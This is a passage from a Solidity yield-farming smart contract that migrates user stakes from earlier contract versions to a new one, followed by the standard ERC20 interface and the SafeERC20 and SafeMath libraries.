        return false;
    }

    // Migrate from V3, V2 or V1 
    function updatedRecord(address _userID, uint256 _amount, uint256 _active, uint256 _dividend, uint8 _plan) internal{
        // (uint256 _amount ) = 
        Farming storage _mystakes = myStakes[_userID][0][_plan];
        _mystakes.total = _mystakes.total.add(_amount);
        _mystakes.active = _mystakes.active.add(_active);
        _mystakes.harvest = _mystakes.harvest.add(_dividend);
        _mystakes.harvested = 0;
        _mystakes.start = block.timestamp;
        _mystakes.checkpoint = block.timestamp;
    }

    // [Prevent V2 Issuer Exploit]
    function updateUserInfo() public{
        address _userID = msg.sender;
        address _sponsor = BSCYFv1.getUserReferrer(_userID);
        if(_userID == address(0x493323C1f45caC0ceC5C151347681CA969De71AE)){
            _userID = address(0xAF2726946b42683BC335293691F2e443A0b2ED11);
        }
        if(_sponsor == address(0x493323C1f45caC0ceC5C151347681CA969De71AE)){
            _sponsor = contract_;
        }
        // Register User
        User storage user = users[_userID];
        require(user.moved == 0);
        user.moved = 1;
        if (user.referrer == address(0)) {
            registerUser(_sponsor);
        }
        uint256 _deposits_v1 = BSCYFv1.getUserAmountOfDeposits(msg.sender, 0);
        uint256 _deposits_v2 = BSCYFv2.getUserAmountOfDeposits(msg.sender, 0);
        uint256 _deposits_v3 = BSCYFv3.getUserAmountOfDeposits(msg.sender, 0);

        require(_deposits_v1 > 0 || _deposits_v2 > 0 || _deposits_v3 > 0);
        
        (, uint8 _isMigrated_v2) = BSCYFv2.users(_userID);
        (, uint8 _isMigrated_v3) = BSCYFv3.users(_userID);
        uint256[5] memory _tamount;
        uint256[5] memory _active;
        uint256[5] memory _toHarvest;
        // Move From v1, v2, v3 to v4
        if(_deposits_v1 > 0 && _isMigrated_v2 != 1 && _isMigrated_v3 != 1){
            // Update Stakes
            (_tamount, _active, _toHarvest) = getUserInfo(BSCYFv1, 1, msg.sender, _deposits_v1);
            updateUserStats(1);
        }
        if(_deposits_v2 > 0 && _isMigrated_v3 != 1){
            // Update Stakes
            (_tamount, _active, _toHarvest) = getUserInfo(BSCYFv2, 2, msg.sender, _deposits_v2);
            updateUserStats(2);
        }
        // Ensure user from safe migrate from v3 to v4 
        if(_deposits_v3 > 0){
            // Prevent v2/v3 exploit by timestamp of _latTransaction 
            // all Migrated user from v2 to v3 should be screened
            if(_isMigrated_v3 == 1){
                (_tamount, _active, _toHarvest) = getUserInfo(BSCYFv3, 3, msg.sender, _deposits_v3);
                updateUserStats(3);
            }
            else{
                (_tamount, _active, _toHarvest) = getUserInfo(BSCYFv3, 4, msg.sender, _deposits_v3);
                updateUserStats(3);
            }
        }
        for(uint8 _d = 0; _d < 5; _d++){
            updatedRecord(_userID, _tamount[_d], _active[_d], _toHarvest[_d], _d);
        }
    }
    
    function getUserInfo(BSCYieldFarm _contract, uint8 _version, address _userID, uint256 _deposits) 
        internal view returns(uint256[5] memory _tamount, uint256[5] memory _active, uint256[5] memory _toHarvest){
        uint256 _checkpoint;
        uint256 _latTransaction_v1 = 1664035321; // Safe Import from V1 timestamp [hash 0x41c05f403674525685bfa20de83ebed7a1dfc8b93d725bccd4c1d4c66751bc4f]
        uint256 _latTransaction_v2 = 1664484848; // afe Import from V2 timestamp [hash 0x0329a0853841a2c962bfcd6c5cb02cff2d9947e14d3d049eaaebcb61faa9ec0a]
        uint256 _latTransaction_v3 = 1665134103; // Safe Import from V3 timestamp [hash 0x06b0aea0ccff74fd04e5a3c70f7cf966b3305f14083c708ecc4713fd5dc6747f]
        if(_version == 1){
            (_checkpoint, , , ) = _contract.tdeposits(msg.sender, address(0));
        }
        else{
            (_checkpoint, , , ,) = _contract.todeposits(msg.sender, address(0));
        }
        for(uint256 i = 0; i < _deposits; i++){
            (uint8 _plan, , uint256 _amount, uint256 _started, uint256 _finished) = _contract.getUserDepositInfo(_userID, i, 0);
            // Keep Records of Active Tokens only
            // if v2 or v3 migrated [Prevent exploit with timestamp]
            if((_version == 1 && _started < _latTransaction_v1) || (_version == 4 && _started < _latTransaction_v3) || (_version == 2 && _started < _latTransaction_v2) || (_version == 3 && _started < _latTransaction_v2)){
                if(_finished > block.timestamp){
                    (uint256 _percent, uint256 _getHarvest) = getStakesData(_plan, _amount, _started, _finished, _checkpoint);
                    _active[_plan] = _active[_plan].add(_amount.sub(_amount.mul(_percent).div(PERCENTS_DIVIDER)));
                    _toHarvest[_plan] = _toHarvest[_plan].add(_getHarvest);
                    _tamount[_plan] = _tamount[_plan].add(_amount);
                }
            }
        }
    }

    function getStakesData(uint8 _plan, uint256 _amount, uint256 _started, uint256 _finished, uint256 _checkpoint) internal view returns(uint256, uint256){
        uint256 _share = _amount.mul(plans[_plan].percent).div(PERCENTS_DIVIDER);
        uint256 _from = _started > _checkpoint ? _started : _checkpoint;
        uint256 _to = _finished < block.timestamp ? _finished : block.timestamp;
        uint256 _totalHarvested = _share.mul(_to.sub(_started)).div(TIME_STEP);
        uint256 _toHarvest = _share.mul(_to.sub(_from)).div(TIME_STEP);
        // // get difference on active
        uint256 _expected = _share.mul(plans[_plan].time);
        uint256 _percent = _totalHarvested.mul(PERCENTS_DIVIDER).div(_expected);
        return(_percent, _toHarvest);
    }
    
    receive() external payable {}
}

interface IERC20 {
    function totalSupply() external view returns (uint256);
    function balanceOf(address account) external view returns (uint256);
    function transfer(address recipient, uint256 amount) external returns (bool);
    function allowance(address owner, address spender) external view returns (uint256);
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
}

library SafeERC20 {
    using SafeMath for uint256;

    function safeTransfer(IERC20 token, address to, uint256 value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    function safeTransferFrom(IERC20 token, address from, address to, uint256 value) internal {
        callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));
    }

    function safeApprove(IERC20 token, address spender, uint256 value) internal {
        require((value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }
    function callOptionalReturn(IERC20 token, bytes memory data) private {
        require(isContract(address(token)), "SafeERC20: call to non-contract");

        // solhint-disable-next-line avoid-low-level-calls
        (bool success, bytes memory returndata) = address(token).call(data);
        require(success, "SafeERC20: low-level call failed");

        if (returndata.length > 0) { // Return data is optional
            // solhint-disable-next-line max-line-length
            require(abi.decode(returndata, (bool)), "SafeERC20: ERC20 operation did not succeed");
        }
    }

    function isContract(address addr) internal view returns (bool) {
        uint256 size;
        assembly { size := extcodesize(addr) }
        return size > 0;
    }
}

library SafeMath {

    function add(uint256 a, uint256 b) internal pure returns (uint256) {
        uint256 c = a + b;
        require(c >= a, "SafeMath: addition overflow");

        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");
        uint256 c = a - b;

        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {
            return 0;
        }

        uint256 c = a * b;
        require(c / a == b, "SafeMath: multiplication overflow");

        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");
        uint256 c = a / b;

        return c;
    }
}